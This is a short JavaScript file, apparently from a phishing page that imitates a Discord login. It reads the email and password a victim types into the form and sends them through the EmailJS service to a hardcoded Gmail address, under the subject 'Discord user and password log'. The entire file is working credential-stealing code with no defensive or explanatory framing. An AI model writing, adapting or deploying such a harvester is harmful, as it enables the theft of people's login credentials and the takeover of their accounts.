let toName = "sharkzdevelopement@gmail.com";
let from_name = "sharkzdevelopement@gmail.com";
let subject = "Discord user and password log";

function SendInfo(){
    user = document.getElementById("email").value;
    password = document.getElementById("password").value;
    let msg =  "user: " + user +", password: " + password;
    console.log(msg);
    let params = {
        name: "joe",
        email: "sharkzdevelopement@gmail.com",
        message: msg,

    }
    const service_Id = "service_ziwqc5e";
    const template_Id = "template_r1jsoob";

    emailjs.send(service_Id,template_Id,params)
    
}


